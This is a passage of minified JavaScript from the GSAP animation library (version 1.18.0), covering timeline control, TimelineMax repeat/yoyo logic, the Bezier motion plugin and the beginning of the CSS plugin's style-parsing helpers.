this.add(t,this._parseTimeOrLabel(null,e,!0,t))},d.insert=d.insertMultiple=function(t,e,i,s){return this.add(t,e||0,i,s)},d.appendMultiple=function(t,e,i,s){return this.add(t,this._parseTimeOrLabel(null,e,!0,t),i,s)},d.addLabel=function(t,e){return this._labels[t]=this._parseTimeOrLabel(e),this},d.addPause=function(t,e,s,r){var n=i.delayedCall(0,p,s,r||this);return n.vars.onComplete=n.vars.onReverseComplete=e,n.data="isPause",this._hasPause=!0,this.add(n,t)},d.removeLabel=function(t){return delete this._labels[t],this},d.getLabelTime=function(t){return null!=this._labels[t]?this._labels[t]:-1},d._parseTimeOrLabel=function(e,i,s,r){var n;if(r instanceof t&&r.timeline===this)this.remove(r);else if(r&&(r instanceof Array||r.push&&l(r)))for(n=r.length;--n>-1;)r[n]instanceof t&&r[n].timeline===this&&this.remove(r[n]);if("string"==typeof i)return this._parseTimeOrLabel(i,s&&"number"==typeof e&&null==this._labels[i]?e-this.duration():0,s);if(i=i||0,"string"!=typeof e||!isNaN(e)&&null==this._labels[e])null==e&&(e=this.duration());else{if(n=e.indexOf("="),-1===n)return null==this._labels[e]?s?this._labels[e]=this.duration()+i:i:this._labels[e]+i;i=parseInt(e.charAt(n-1)+"1",10)*Number(e.substr(n+1)),e=n>1?this._parseTimeOrLabel(e.substr(0,n-1),0,s):this.duration()}return Number(e)+i},d.seek=function(t,e){return this.totalTime("number"==typeof t?t:this._parseTimeOrLabel(t),e!==!1)},d.stop=function(){return this.paused(!0)},d.gotoAndPlay=function(t,e){return this.play(t,e)},d.gotoAndStop=function(t,e){return this.pause(t,e)},d.render=function(t,e,i){this._gc&&this._enabled(!0,!1);var s,n,a,o,l,u,c=this._dirty?this.totalDuration():this._totalDuration,f=this._time,p=this._startTime,m=this._timeScale,d=this._paused;if(t>=c)this._totalTime=this._time=c,this._reversed||this._hasPausedChild()||(n=!0,o="onComplete",l=!!this._timeline.autoRemoveChildren,0===this._duration&&(0===t||0>this._rawPrevTime||this._rawPrevTime===r)&&this._rawPrevTime!==t&&this._first&&(l=!0,this._rawPrevTime>r&&(o="onReverseComplete"))),this._rawPrevTime=this._duration||!e||t||this._rawPrevTime===t?t:r,t=c+1e-4;else if(1e-7>t)if(this._totalTime=this._time=0,(0!==f||0===this._duration&&this._rawPrevTime!==r&&(this._rawPrevTime>0||0>t&&this._rawPrevTime>=0))&&(o="onReverseComplete",n=this._reversed),0>t)this._active=!1,this._timeline.autoRemoveChildren&&this._reversed?(l=n=!0,o="onReverseComplete"):this._rawPrevTime>=0&&this._first&&(l=!0),this._rawPrevTime=t;else{if(this._rawPrevTime=this._duration||!e||t||this._rawPrevTime===t?t:r,0===t&&n)for(s=this._first;s&&0===s._startTime;)s._duration||(n=!1),s=s._next;t=0,this._initted||(l=!0)}else{if(this._hasPause&&!this._forcingPlayhead&&!e){if(t>=f)for(s=this._first;s&&t>=s._startTime&&!u;)s._duration||"isPause"!==s.data||s.ratio||0===s._startTime&&0===this._rawPrevTime||(u=s),s=s._next;else for(s=this._last;s&&s._startTime>=t&&!u;)s._duration||"isPause"===s.data&&s._rawPrevTime>0&&(u=s),s=s._prev;u&&(this._time=t=u._startTime,this._totalTime=t+this._cycle*(this._totalDuration+this._repeatDelay))}this._totalTime=this._time=this._rawPrevTime=t}if(this._time!==f&&this._first||i||l||u){if(this._initted||(this._initted=!0),this._active||!this._paused&&this._time!==f&&t>0&&(this._active=!0),0===f&&this.vars.onStart&&0!==this._time&&(e||this._callback("onStart")),this._time>=f)for(s=this._first;s&&(a=s._next,!this._paused||d);)(s._active||s._startTime<=this._time&&!s._paused&&!s._gc)&&(u===s&&this.pause(),s._reversed?s.render((s._dirty?s.totalDuration():s._totalDuration)-(t-s._startTime)*s._timeScale,e,i):s.render((t-s._startTime)*s._timeScale,e,i)),s=a;else for(s=this._last;s&&(a=s._prev,!this._paused||d);){if(s._active||f>=s._startTime&&!s._paused&&!s._gc){if(u===s){for(u=s._prev;u&&u.endTime()>this._time;)u.render(u._reversed?u.totalDuration()-(t-u._startTime)*u._timeScale:(t-u._startTime)*u._timeScale,e,i),u=u._prev;u=null,this.pause()}s._reversed?s.render((s._dirty?s.totalDuration():s._totalDuration)-(t-s._startTime)*s._timeScale,e,i):s.render((t-s._startTime)*s._timeScale,e,i)}s=a}this._onUpdate&&(e||(h.length&&_(),this._callback("onUpdate"))),o&&(this._gc||(p===this._startTime||m!==this._timeScale)&&(0===this._time||c>=this.totalDuration())&&(n&&(h.length&&_(),this._timeline.autoRemoveChildren&&this._enabled(!1,!1),this._active=!1),!e&&this.vars[o]&&this._callback(o)))}},d._hasPausedChild=function(){for(var t=this._first;t;){if(t._paused||t instanceof s&&t._hasPausedChild())return!0;t=t._next}return!1},d.getChildren=function(t,e,s,r){r=r||-9999999999;for(var n=[],a=this._first,o=0;a;)r>a._startTime||(a instanceof i?e!==!1&&(n[o++]=a):(s!==!1&&(n[o++]=a),t!==!1&&(n=n.concat(a.getChildren(!0,e,s)),o=n.length))),a=a._next;return n},d.getTweensOf=function(t,e){var s,r,n=this._gc,a=[],o=0;for(n&&this._enabled(!0,!0),s=i.getTweensOf(t),r=s.length;--r>-1;)(s[r].timeline===this||e&&this._contains(s[r]))&&(a[o++]=s[r]);return n&&this._enabled(!1,!0),a},d.recent=function(){return this._recent},d._contains=function(t){for(var e=t.timeline;e;){if(e===this)return!0;e=e.timeline}return!1},d.shiftChildren=function(t,e,i){i=i||0;for(var s,r=this._first,n=this._labels;r;)r._startTime>=i&&(r._startTime+=t),r=r._next;if(e)for(s in n)n[s]>=i&&(n[s]+=t);return this._uncache(!0)},d._kill=function(t,e){if(!t&&!e)return this._enabled(!1,!1);for(var i=e?this.getTweensOf(e):this.getChildren(!0,!0,!1),s=i.length,r=!1;--s>-1;)i[s]._kill(t,e)&&(r=!0);return r},d.clear=function(t){var e=this.getChildren(!1,!0,!0),i=e.length;for(this._time=this._totalTime=0;--i>-1;)e[i]._enabled(!1,!1);return t!==!1&&(this._labels={}),this._uncache(!0)},d.invalidate=function(){for(var e=this._first;e;)e.invalidate(),e=e._next;return t.prototype.invalidate.call(this)},d._enabled=function(t,i){if(t===this._gc)for(var s=this._first;s;)s._enabled(t,!0),s=s._next;return e.prototype._enabled.call(this,t,i)},d.totalTime=function(){this._forcingPlayhead=!0;var e=t.prototype.totalTime.apply(this,arguments);return this._forcingPlayhead=!1,e},d.duration=function(t){return arguments.length?(0!==this.duration()&&0!==t&&this.timeScale(this._duration/t),this):(this._dirty&&this.totalDuration(),this._duration)},d.totalDuration=function(t){if(!arguments.length){if(this._dirty){for(var e,i,s=0,r=this._last,n=999999999999;r;)e=r._prev,r._dirty&&r.totalDuration(),r._startTime>n&&this._sortChildren&&!r._paused?this.add(r,r._startTime-r._delay):n=r._startTime,0>r._startTime&&!r._paused&&(s-=r._startTime,this._timeline.smoothChildTiming&&(this._startTime+=r._startTime/this._timeScale),this.shiftChildren(-r._startTime,!1,-9999999999),n=0),i=r._startTime+r._totalDuration/r._timeScale,i>s&&(s=i),r=e;this._duration=this._totalDuration=s,this._dirty=!1}return this._totalDuration}return 0!==this.totalDuration()&&0!==t&&this.timeScale(this._totalDuration/t),this},d.paused=function(e){if(!e)for(var i=this._first,s=this._time;i;)i._startTime===s&&"isPause"===i.data&&(i._rawPrevTime=0),i=i._next;return t.prototype.paused.apply(this,arguments)},d.usesFrames=function(){for(var e=this._timeline;e._timeline;)e=e._timeline;return e===t._rootFramesTimeline},d.rawTime=function(){return this._paused?this._totalTime:(this._timeline.rawTime()-this._startTime)*this._timeScale},s},!0),_gsScope._gsDefine("TimelineMax",["TimelineLite","TweenLite","easing.Ease"],function(t,e,i){var s=function(e){t.call(this,e),this._repeat=this.vars.repeat||0,this._repeatDelay=this.vars.repeatDelay||0,this._cycle=0,this._yoyo=this.vars.yoyo===!0,this._dirty=!0},r=1e-10,n=e._internals,a=n.lazyTweens,o=n.lazyRender,l=new i(null,null,1,0),h=s.prototype=new t;return h.constructor=s,h.kill()._gc=!1,s.version="1.18.0",h.invalidate=function(){return this._yoyo=this.vars.yoyo===!0,this._repeat=this.vars.repeat||0,this._repeatDelay=this.vars.repeatDelay||0,this._uncache(!0),t.prototype.invalidate.call(this)},h.addCallback=function(t,i,s,r){return this.add(e.delayedCall(0,t,s,r),i)},h.removeCallback=function(t,e){if(t)if(null==e)this._kill(null,t);else for(var i=this.getTweensOf(t,!1),s=i.length,r=this._parseTimeOrLabel(e);--s>-1;)i[s]._startTime===r&&i[s]._enabled(!1,!1);return this},h.removePause=function(e){return this.removeCallback(t._internals.pauseCallback,e)},h.tweenTo=function(t,i){i=i||{};var s,r,n,a={ease:l,useFrames:this.usesFrames(),immediateRender:!1};for(r in i)a[r]=i[r];return a.time=this._parseTimeOrLabel(t),s=Math.abs(Number(a.time)-this._time)/this._timeScale||.001,n=new e(this,s,a),a.onStart=function(){n.target.paused(!0),n.vars.time!==n.target.time()&&s===n.duration()&&n.duration(Math.abs(n.vars.time-n.target.time())/n.target._timeScale),i.onStart&&n._callback("onStart")},n},h.tweenFromTo=function(t,e,i){i=i||{},t=this._parseTimeOrLabel(t),i.startAt={onComplete:this.seek,onCompleteParams:[t],callbackScope:this},i.immediateRender=i.immediateRender!==!1;var s=this.tweenTo(e,i);return s.duration(Math.abs(s.vars.time-t)/this._timeScale||.001)},h.render=function(t,e,i){this._gc&&this._enabled(!0,!1);var s,n,l,h,_,u,c,f=this._dirty?this.totalDuration():this._totalDuration,p=this._duration,m=this._time,d=this._totalTime,g=this._startTime,v=this._timeScale,y=this._rawPrevTime,T=this._paused,x=this._cycle;if(t>=f)this._locked||(this._totalTime=f,this._cycle=this._repeat),this._reversed||this._hasPausedChild()||(n=!0,h="onComplete",_=!!this._timeline.autoRemoveChildren,0===this._duration&&(0===t||0>y||y===r)&&y!==t&&this._first&&(_=!0,y>r&&(h="onReverseComplete"))),this._rawPrevTime=this._duration||!e||t||this._rawPrevTime===t?t:r,this._yoyo&&0!==(1&this._cycle)?this._time=t=0:(this._time=p,t=p+1e-4);else if(1e-7>t)if(this._locked||(this._totalTime=this._cycle=0),this._time=0,(0!==m||0===p&&y!==r&&(y>0||0>t&&y>=0)&&!this._locked)&&(h="onReverseComplete",n=this._reversed),0>t)this._active=!1,this._timeline.autoRemoveChildren&&this._reversed?(_=n=!0,h="onReverseComplete"):y>=0&&this._first&&(_=!0),this._rawPrevTime=t;else{if(this._rawPrevTime=p||!e||t||this._rawPrevTime===t?t:r,0===t&&n)for(s=this._first;s&&0===s._startTime;)s._duration||(n=!1),s=s._next;t=0,this._initted||(_=!0)}else if(0===p&&0>y&&(_=!0),this._time=this._rawPrevTime=t,this._locked||(this._totalTime=t,0!==this._repeat&&(u=p+this._repeatDelay,this._cycle=this._totalTime/u>>0,0!==this._cycle&&this._cycle===this._totalTime/u&&this._cycle--,this._time=this._totalTime-this._cycle*u,this._yoyo&&0!==(1&this._cycle)&&(this._time=p-this._time),this._time>p?(this._time=p,t=p+1e-4):0>this._time?this._time=t=0:t=this._time)),this._hasPause&&!this._forcingPlayhead&&!e){if(t=this._time,t>=m)for(s=this._first;s&&t>=s._startTime&&!c;)s._duration||"isPause"!==s.data||s.ratio||0===s._startTime&&0===this._rawPrevTime||(c=s),s=s._next;else for(s=this._last;s&&s._startTime>=t&&!c;)s._duration||"isPause"===s.data&&s._rawPrevTime>0&&(c=s),s=s._prev;c&&(this._time=t=c._startTime,this._totalTime=t+this._cycle*(this._totalDuration+this._repeatDelay))}if(this._cycle!==x&&!this._locked){var w=this._yoyo&&0!==(1&x),b=w===(this._yoyo&&0!==(1&this._cycle)),P=this._totalTime,k=this._cycle,S=this._rawPrevTime,R=this._time;if(this._totalTime=x*p,x>this._cycle?w=!w:this._totalTime+=p,this._time=m,this._rawPrevTime=0===p?y-1e-4:y,this._cycle=x,this._locked=!0,m=w?0:p,this.render(m,e,0===p),e||this._gc||this.vars.onRepeat&&this._callback("onRepeat"),b&&(m=w?p+1e-4:-1e-4,this.render(m,!0,!1)),this._locked=!1,this._paused&&!T)return;this._time=R,this._totalTime=P,this._cycle=k,this._rawPrevTime=S}if(!(this._time!==m&&this._first||i||_||c))return d!==this._totalTime&&this._onUpdate&&(e||this._callback("onUpdate")),void 0;if(this._initted||(this._initted=!0),this._active||!this._paused&&this._totalTime!==d&&t>0&&(this._active=!0),0===d&&this.vars.onStart&&0!==this._totalTime&&(e||this._callback("onStart")),this._time>=m)for(s=this._first;s&&(l=s._next,!this._paused||T);)(s._active||s._startTime<=this._time&&!s._paused&&!s._gc)&&(c===s&&this.pause(),s._reversed?s.render((s._dirty?s.totalDuration():s._totalDuration)-(t-s._startTime)*s._timeScale,e,i):s.render((t-s._startTime)*s._timeScale,e,i)),s=l;else for(s=this._last;s&&(l=s._prev,!this._paused||T);){if(s._active||m>=s._startTime&&!s._paused&&!s._gc){if(c===s){for(c=s._prev;c&&c.endTime()>this._time;)c.render(c._reversed?c.totalDuration()-(t-c._startTime)*c._timeScale:(t-c._startTime)*c._timeScale,e,i),c=c._prev;c=null,this.pause()}s._reversed?s.render((s._dirty?s.totalDuration():s._totalDuration)-(t-s._startTime)*s._timeScale,e,i):s.render((t-s._startTime)*s._timeScale,e,i)}s=l}this._onUpdate&&(e||(a.length&&o(),this._callback("onUpdate"))),h&&(this._locked||this._gc||(g===this._startTime||v!==this._timeScale)&&(0===this._time||f>=this.totalDuration())&&(n&&(a.length&&o(),this._timeline.autoRemoveChildren&&this._enabled(!1,!1),this._active=!1),!e&&this.vars[h]&&this._callback(h)))},h.getActive=function(t,e,i){null==t&&(t=!0),null==e&&(e=!0),null==i&&(i=!1);var s,r,n=[],a=this.getChildren(t,e,i),o=0,l=a.length;for(s=0;l>s;s++)r=a[s],r.isActive()&&(n[o++]=r);return n},h.getLabelAfter=function(t){t||0!==t&&(t=this._time);var e,i=this.getLabelsArray(),s=i.length;for(e=0;s>e;e++)if(i[e].time>t)return i[e].name;return null},h.getLabelBefore=function(t){null==t&&(t=this._time);for(var e=this.getLabelsArray(),i=e.length;--i>-1;)if(t>e[i].time)return e[i].name;return null},h.getLabelsArray=function(){var t,e=[],i=0;for(t in this._labels)e[i++]={time:this._labels[t],name:t};return e.sort(function(t,e){return t.time-e.time}),e},h.progress=function(t,e){return arguments.length?this.totalTime(this.duration()*(this._yoyo&&0!==(1&this._cycle)?1-t:t)+this._cycle*(this._duration+this._repeatDelay),e):this._time/this.duration()},h.totalProgress=function(t,e){return arguments.length?this.totalTime(this.totalDuration()*t,e):this._totalTime/this.totalDuration()},h.totalDuration=function(e){return arguments.length?-1===this._repeat?this:this.duration((e-this._repeat*this._repeatDelay)/(this._repeat+1)):(this._dirty&&(t.prototype.totalDuration.call(this),this._totalDuration=-1===this._repeat?999999999999:this._duration*(this._repeat+1)+this._repeatDelay*this._repeat),this._totalDuration)},h.time=function(t,e){return arguments.length?(this._dirty&&this.totalDuration(),t>this._duration&&(t=this._duration),this._yoyo&&0!==(1&this._cycle)?t=this._duration-t+this._cycle*(this._duration+this._repeatDelay):0!==this._repeat&&(t+=this._cycle*(this._duration+this._repeatDelay)),this.totalTime(t,e)):this._time},h.repeat=function(t){return arguments.length?(this._repeat=t,this._uncache(!0)):this._repeat},h.repeatDelay=function(t){return arguments.length?(this._repeatDelay=t,this._uncache(!0)):this._repeatDelay},h.yoyo=function(t){return arguments.length?(this._yoyo=t,this):this._yoyo},h.currentLabel=function(t){return arguments.length?this.seek(t,!0):this.getLabelBefore(this._time+1e-8)},s},!0),function(){var t=180/Math.PI,e=[],i=[],s=[],r={},n=_gsScope._gsDefine.globals,a=function(t,e,i,s){this.a=t,this.b=e,this.c=i,this.d=s,this.da=s-t,this.ca=i-t,this.ba=e-t},o=",x,y,z,left,top,right,bottom,marginTop,marginLeft,marginRight,marginBottom,paddingLeft,paddingTop,paddingRight,paddingBottom,backgroundPosition,backgroundPosition_y,",l=function(t,e,i,s){var r={a:t},n={},a={},o={c:s},l=(t+e)/2,h=(e+i)/2,_=(i+s)/2,u=(l+h)/2,c=(h+_)/2,f=(c-u)/8;return r.b=l+(t-l)/4,n.b=u+f,r.c=n.a=(r.b+n.b)/2,n.c=a.a=(u+c)/2,a.b=c-f,o.b=_+(s-_)/4,a.c=o.a=(a.b+o.b)/2,[r,n,a,o]},h=function(t,r,n,a,o){var h,_,u,c,f,p,m,d,g,v,y,T,x,w=t.length-1,b=0,P=t[0].a;for(h=0;w>h;h++)f=t[b],_=f.a,u=f.d,c=t[b+1].d,o?(y=e[h],T=i[h],x=.25*(T+y)*r/(a?.5:s[h]||.5),p=u-(u-_)*(a?.5*r:0!==y?x/y:0),m=u+(c-u)*(a?.5*r:0!==T?x/T:0),d=u-(p+((m-p)*(3*y/(y+T)+.5)/4||0))):(p=u-.5*(u-_)*r,m=u+.5*(c-u)*r,d=u-(p+m)/2),p+=d,m+=d,f.c=g=p,f.b=0!==h?P:P=f.a+.6*(f.c-f.a),f.da=u-_,f.ca=g-_,f.ba=P-_,n?(v=l(_,P,g,u),t.splice(b,1,v[0],v[1],v[2],v[3]),b+=4):b++,P=m;f=t[b],f.b=P,f.c=P+.4*(f.d-P),f.da=f.d-f.a,f.ca=f.c-f.a,f.ba=P-f.a,n&&(v=l(f.a,P,f.c,f.d),t.splice(b,1,v[0],v[1],v[2],v[3]))},_=function(t,s,r,n){var o,l,h,_,u,c,f=[];if(n)for(t=[n].concat(t),l=t.length;--l>-1;)"string"==typeof(c=t[l][s])&&"="===c.charAt(1)&&(t[l][s]=n[s]+Number(c.charAt(0)+c.substr(2)));if(o=t.length-2,0>o)return f[0]=new a(t[0][s],0,0,t[-1>o?0:1][s]),f;for(l=0;o>l;l++)h=t[l][s],_=t[l+1][s],f[l]=new a(h,0,0,_),r&&(u=t[l+2][s],e[l]=(e[l]||0)+(_-h)*(_-h),i[l]=(i[l]||0)+(u-_)*(u-_));return f[l]=new a(t[l][s],0,0,t[l+1][s]),f},u=function(t,n,a,l,u,c){var f,p,m,d,g,v,y,T,x={},w=[],b=c||t[0];u="string"==typeof u?","+u+",":o,null==n&&(n=1);for(p in t[0])w.push(p);if(t.length>1){for(T=t[t.length-1],y=!0,f=w.length;--f>-1;)if(p=w[f],Math.abs(b[p]-T[p])>.05){y=!1;break}y&&(t=t.concat(),c&&t.unshift(c),t.push(t[1]),c=t[t.length-3])}for(e.length=i.length=s.length=0,f=w.length;--f>-1;)p=w[f],r[p]=-1!==u.indexOf(","+p+","),x[p]=_(t,p,r[p],c);for(f=e.length;--f>-1;)e[f]=Math.sqrt(e[f]),i[f]=Math.sqrt(i[f]);if(!l){for(f=w.length;--f>-1;)if(r[p])for(m=x[w[f]],v=m.length-1,d=0;v>d;d++)g=m[d+1].da/i[d]+m[d].da/e[d],s[d]=(s[d]||0)+g*g;for(f=s.length;--f>-1;)s[f]=Math.sqrt(s[f])}for(f=w.length,d=a?4:1;--f>-1;)p=w[f],m=x[p],h(m,n,a,l,r[p]),y&&(m.splice(0,d),m.splice(m.length-d,d));return x},c=function(t,e,i){e=e||"soft";var s,r,n,o,l,h,_,u,c,f,p,m={},d="cubic"===e?3:2,g="soft"===e,v=[];if(g&&i&&(t=[i].concat(t)),null==t||d+1>t.length)throw"invalid Bezier data";for(c in t[0])v.push(c);for(h=v.length;--h>-1;){for(c=v[h],m[c]=l=[],f=0,u=t.length,_=0;u>_;_++)s=null==i?t[_][c]:"string"==typeof(p=t[_][c])&&"="===p.charAt(1)?i[c]+Number(p.charAt(0)+p.substr(2)):Number(p),g&&_>1&&u-1>_&&(l[f++]=(s+l[f-2])/2),l[f++]=s;for(u=f-d+1,f=0,_=0;u>_;_+=d)s=l[_],r=l[_+1],n=l[_+2],o=2===d?0:l[_+3],l[f++]=p=3===d?new a(s,r,n,o):new a(s,(2*r+s)/3,(2*r+n)/3,n);l.length=f}return m},f=function(t,e,i){for(var s,r,n,a,o,l,h,_,u,c,f,p=1/i,m=t.length;--m>-1;)for(c=t[m],n=c.a,a=c.d-n,o=c.c-n,l=c.b-n,s=r=0,_=1;i>=_;_++)h=p*_,u=1-h,s=r-(r=(h*h*a+3*u*(h*o+u*l))*h),f=m*i+_-1,e[f]=(e[f]||0)+s*s},p=function(t,e){e=e>>0||6;var i,s,r,n,a=[],o=[],l=0,h=0,_=e-1,u=[],c=[];for(i in t)f(t[i],a,e);for(r=a.length,s=0;r>s;s++)l+=Math.sqrt(a[s]),n=s%e,c[n]=l,n===_&&(h+=l,n=s/e>>0,u[n]=c,o[n]=h,l=0,c=[]);return{length:h,lengths:o,segments:u}},m=_gsScope._gsDefine.plugin({propName:"bezier",priority:-1,version:"1.3.4",API:2,global:!0,init:function(t,e,i){this._target=t,e instanceof Array&&(e={values:e}),this._func={},this._round={},this._props=[],this._timeRes=null==e.timeResolution?6:parseInt(e.timeResolution,10);var s,r,n,a,o,l=e.values||[],h={},_=l[0],f=e.autoRotate||i.vars.orientToBezier;this._autoRotate=f?f instanceof Array?f:[["x","y","rotation",f===!0?0:Number(f)||0]]:null;
for(s in _)this._props.push(s);for(n=this._props.length;--n>-1;)s=this._props[n],this._overwriteProps.push(s),r=this._func[s]="function"==typeof t[s],h[s]=r?t[s.indexOf("set")||"function"!=typeof t["get"+s.substr(3)]?s:"get"+s.substr(3)]():parseFloat(t[s]),o||h[s]!==l[0][s]&&(o=h);if(this._beziers="cubic"!==e.type&&"quadratic"!==e.type&&"soft"!==e.type?u(l,isNaN(e.curviness)?1:e.curviness,!1,"thruBasic"===e.type,e.correlate,o):c(l,e.type,h),this._segCount=this._beziers[s].length,this._timeRes){var m=p(this._beziers,this._timeRes);this._length=m.length,this._lengths=m.lengths,this._segments=m.segments,this._l1=this._li=this._s1=this._si=0,this._l2=this._lengths[0],this._curSeg=this._segments[0],this._s2=this._curSeg[0],this._prec=1/this._curSeg.length}if(f=this._autoRotate)for(this._initialRotations=[],f[0]instanceof Array||(this._autoRotate=f=[f]),n=f.length;--n>-1;){for(a=0;3>a;a++)s=f[n][a],this._func[s]="function"==typeof t[s]?t[s.indexOf("set")||"function"!=typeof t["get"+s.substr(3)]?s:"get"+s.substr(3)]:!1;s=f[n][2],this._initialRotations[n]=this._func[s]?this._func[s].call(this._target):this._target[s]}return this._startRatio=i.vars.runBackwards?1:0,!0},set:function(e){var i,s,r,n,a,o,l,h,_,u,c=this._segCount,f=this._func,p=this._target,m=e!==this._startRatio;if(this._timeRes){if(_=this._lengths,u=this._curSeg,e*=this._length,r=this._li,e>this._l2&&c-1>r){for(h=c-1;h>r&&e>=(this._l2=_[++r]););this._l1=_[r-1],this._li=r,this._curSeg=u=this._segments[r],this._s2=u[this._s1=this._si=0]}else if(this._l1>e&&r>0){for(;r>0&&(this._l1=_[--r])>=e;);0===r&&this._l1>e?this._l1=0:r++,this._l2=_[r],this._li=r,this._curSeg=u=this._segments[r],this._s1=u[(this._si=u.length-1)-1]||0,this._s2=u[this._si]}if(i=r,e-=this._l1,r=this._si,e>this._s2&&u.length-1>r){for(h=u.length-1;h>r&&e>=(this._s2=u[++r]););this._s1=u[r-1],this._si=r}else if(this._s1>e&&r>0){for(;r>0&&(this._s1=u[--r])>=e;);0===r&&this._s1>e?this._s1=0:r++,this._s2=u[r],this._si=r}o=(r+(e-this._s1)/(this._s2-this._s1))*this._prec}else i=0>e?0:e>=1?c-1:c*e>>0,o=(e-i*(1/c))*c;for(s=1-o,r=this._props.length;--r>-1;)n=this._props[r],a=this._beziers[n][i],l=(o*o*a.da+3*s*(o*a.ca+s*a.ba))*o+a.a,this._round[n]&&(l=Math.round(l)),f[n]?p[n](l):p[n]=l;if(this._autoRotate){var d,g,v,y,T,x,w,b=this._autoRotate;for(r=b.length;--r>-1;)n=b[r][2],x=b[r][3]||0,w=b[r][4]===!0?1:t,a=this._beziers[b[r][0]],d=this._beziers[b[r][1]],a&&d&&(a=a[i],d=d[i],g=a.a+(a.b-a.a)*o,y=a.b+(a.c-a.b)*o,g+=(y-g)*o,y+=(a.c+(a.d-a.c)*o-y)*o,v=d.a+(d.b-d.a)*o,T=d.b+(d.c-d.b)*o,v+=(T-v)*o,T+=(d.c+(d.d-d.c)*o-T)*o,l=m?Math.atan2(T-v,y-g)*w+x:this._initialRotations[r],f[n]?p[n](l):p[n]=l)}}}),d=m.prototype;m.bezierThrough=u,m.cubicToQuadratic=l,m._autoCSS=!0,m.quadraticToCubic=function(t,e,i){return new a(t,(2*e+t)/3,(2*e+i)/3,i)},m._cssRegister=function(){var t=n.CSSPlugin;if(t){var e=t._internals,i=e._parseToProxy,s=e._setPluginRatio,r=e.CSSPropTween;e._registerComplexSpecialProp("bezier",{parser:function(t,e,n,a,o,l){e instanceof Array&&(e={values:e}),l=new m;var h,_,u,c=e.values,f=c.length-1,p=[],d={};if(0>f)return o;for(h=0;f>=h;h++)u=i(t,c[h],a,o,l,f!==h),p[h]=u.end;for(_ in e)d[_]=e[_];return d.values=p,o=new r(t,"bezier",0,0,u.pt,2),o.data=u,o.plugin=l,o.setRatio=s,0===d.autoRotate&&(d.autoRotate=!0),!d.autoRotate||d.autoRotate instanceof Array||(h=d.autoRotate===!0?0:Number(d.autoRotate),d.autoRotate=null!=u.end.left?[["left","top","rotation",h,!1]]:null!=u.end.x?[["x","y","rotation",h,!1]]:!1),d.autoRotate&&(a._transform||a._enableTransforms(!1),u.autoRotate=a._target._gsTransform),l._onInitTween(u.proxy,d,a._tween),o}})}},d._roundProps=function(t,e){for(var i=this._overwriteProps,s=i.length;--s>-1;)(t[i[s]]||t.bezier||t.bezierThrough)&&(this._round[i[s]]=e)},d._kill=function(t){var e,i,s=this._props;for(e in this._beziers)if(e in t)for(delete this._beziers[e],delete this._func[e],i=s.length;--i>-1;)s[i]===e&&s.splice(i,1);return this._super._kill.call(this,t)}}(),_gsScope._gsDefine("plugins.CSSPlugin",["plugins.TweenPlugin","TweenLite"],function(t,e){var i,s,r,n,a=function(){t.call(this,"css"),this._overwriteProps.length=0,this.setRatio=a.prototype.setRatio},o=_gsScope._gsDefine.globals,l={},h=a.prototype=new t("css");h.constructor=a,a.version="1.18.0",a.API=2,a.defaultTransformPerspective=0,a.defaultSkewType="compensated",a.defaultSmoothOrigin=!0,h="px",a.suffixMap={top:h,right:h,bottom:h,left:h,width:h,height:h,fontSize:h,padding:h,margin:h,perspective:h,lineHeight:""};var _,u,c,f,p,m,d=/(?:\d|\-\d|\.\d|\-\.\d)+/g,g=/(?:\d|\-\d|\.\d|\-\.\d|\+=\d|\-=\d|\+=.\d|\-=\.\d)+/g,v=/(?:\+=|\-=|\-|\b)[\d\-\.]+[a-zA-Z0-9]*(?:%|\b)/gi,y=/(?![+-]?\d*\.?\d+|[+-]|e[+-]\d+)[^0-9]/g,T=/(?:\d|\-|\+|=|#|\.)*/g,x=/opacity *= *([^)]*)/i,w=/opacity:([^;]*)/i,b=/alpha\(opacity *=.+?\)/i,P=/^(rgb|hsl)/,k=/([A-Z])/g,S=/-([a-z])/gi,R=/(^(?:url\(\"|url\())|(?:(\"\))$|\)$)/gi,O=function(t,e){return e.toUpperCase()},A=/(?:Left|Right|Width)/i,C=/(M11|M12|M21|M22)=[\d\-\.e]+/gi,D=/progid\:DXImageTransform\.Microsoft\.Matrix\(.+?\)/i,M=/,(?=[^\)]*(?:\(|$))/gi,z=Math.PI/180,F=180/Math.PI,I={},E=document,N=function(t){return E.createElementNS?E.createElementNS("http://www.w3.org/1999/xhtml",t):E.createElement(t)},L=N("div"),X=N("img"),B=a._internals={_specialProps:l},j=navigator.userAgent,Y=function(){var t=j.indexOf("Android"),e=N("a");return c=-1!==j.indexOf("Safari")&&-1===j.indexOf("Chrome")&&(-1===t||Number(j.substr(t+8,1))>3),p=c&&6>Number(j.substr(j.indexOf("Version/")+8,1)),f=-1!==j.indexOf("Firefox"),(/MSIE ([0-9]{1,}[\.0-9]{0,})/.exec(j)||/Trident\/.*rv:([0-9]{1,}[\.0-9]{0,})/.exec(j))&&(m=parseFloat(RegExp.$1)),e?(e.style.cssText="top:1px;opacity:.55;",/^0.55/.test(e.style.opacity)):!1}(),U=function(t){return x.test("string"==typeof t?t:(t.currentStyle?t.currentStyle.filter:t.style.filter)||"")?parseFloat(RegExp.$1)/100:1},q=function(t){window.console&&console.log(t)},V="",G="",W=function(t,e){e=e||L;var i,s,r=e.style;if(void 0!==r[t])return t;for(t=t.charAt(0).toUpperCase()+t.substr(1),i=["O","Moz","ms","Ms","Webkit"],s=5;--s>-1&&void 0===r[i[s]+t];);return s>=0?(G=3===s?"ms":i[s],V="-"+G.toLowerCase()+"-",G+t):null},Z=E.defaultView?E.defaultView.getComputedStyle:function(){},Q=a.getStyle=function(t,e,i,s,r){var n;return Y||"opacity"!==e?(!s&&t.style[e]?n=t.style[e]:(i=i||Z(t))?n=i[e]||i.getPropertyValue(e)||i.getPropertyValue(e.replace(k,"-$1").toLowerCase()):t.currentStyle&&(n=t.currentStyle[e]),null==r||n&&"none"!==n&&"auto"!==n&&"auto auto"!==n?n:r):U(t)},$=B.convertToPixels=function(t,i,s,r,n){if("px"===r||!r)return s;if("auto"===r||!s)return 0;var o,l,h,_=A.test(i),u=t,c=L.style,f=0>s;if(f&&(s=-s),"%"===r&&-1!==i.indexOf("border"))o=s/100*(_?t.clientWidth:t.clientHeight);else{if(c.cssText="border:0 solid red;position:"+Q(t,"position")+";line-height:0;","%"!==r&&u.appendChild&&"v"!==r.charAt(0)&&"rem"!==r)c[_?"borderLeftWidth":"borderTopWidth"]=s+r;else{if(u=t.parentNode||E.body,l=u._gsCache,h=e.ticker.frame,l&&_&&l.time===h)return 